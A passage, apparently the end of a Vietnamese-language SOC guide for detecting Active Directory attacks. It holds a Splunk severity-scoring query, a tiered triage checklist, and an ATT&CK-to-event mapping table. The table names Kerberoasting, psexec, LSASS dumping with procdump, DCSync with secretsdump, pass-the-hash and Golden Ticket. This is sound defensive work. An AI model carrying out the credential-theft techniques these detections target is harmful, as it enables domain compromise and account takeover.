| stats values(signal) as signals dc(signal) as signal_count values(src_ip) as sources
  by host, user, bin(_time,15m)
| eval severity=case(signal_count>=4,"critical",signal_count=3,"high",signal_count=2,"medium",true(),"low")
```

---

## 14. SOC triage checklist

### Tier 1

- Xác định event, user, source IP, destination, thời gian và DC ghi log.
- Kiểm tra account/host có thuộc baseline không.
- Kiểm tra có correlation 4769 → 4624/4672 → Sysmon 10/4662 không.
- Không đóng alert chỉ vì RC4 hoặc 4769 volume cao.
- Escalate ngay nếu thấy replication GUID từ workstation/Kali, LSASS access không rõ nguồn, hoặc nhiều tín hiệu trong 15 phút.

### Tier 2

- Xác minh log completeness và clock skew giữa DC/WS01/Splunk.
- Xác định process/parent/command line và chữ ký số.
- Rà soát SPN, quyền service account, DS-Replication rights và host mới.
- Cô lập endpoint nếu có credential dumping; xem xét reset credential.
- Nếu có DCSync/Golden Ticket: kích hoạt playbook domain compromise và quy trình reset KRBTGT hai lần.

---

## 15. Mapping ATT&CK và event

| Kỹ thuật | ATT&CK | Event/telemetry | Phase |
|---|---|---|---|
| Domain Enumeration | T1087.002 | LDAP query, 4768/4769 | 6 |
| Kerberoasting | T1558.003 | 4769, SPN, RC4/AES | 7 |
| **Remote Services (psexec)** | T1021.002 | 5145, 4624 type 3, 4672 | 8 |
| **LSASS Dump (procdump)** | T1003.001 | Sysmon 1/10/11, 5145 | 9 |
| **DCSync (secretsdump)** | T1003.006 | 4662 + replication GUID | 10 |
| Pass the Hash | T1550.002 | 4624 NTLM type 3, 4776 | 11 |
| Pass the Ticket | T1550.003 | 4768/4769/4624 correlation | 11 |
| **Golden Ticket** | T1558.001 | 4768 **không kèm** 4769, lifetime, src_ip | 12 |

---
### Nguồn tham khảo nên liên kết 

- Microsoft Learn: Windows Security auditing và Event ID 4768/4769/4662.
- Microsoft Sysinternals: Sysmon Event ID 1/10/11.
- MITRE ATT&CK: T1558.003, T1003.001, T1003.006, T1550.002/.003.
- Splunk Security Content: Kerberos RC4, DCSync và LSASS hunting.

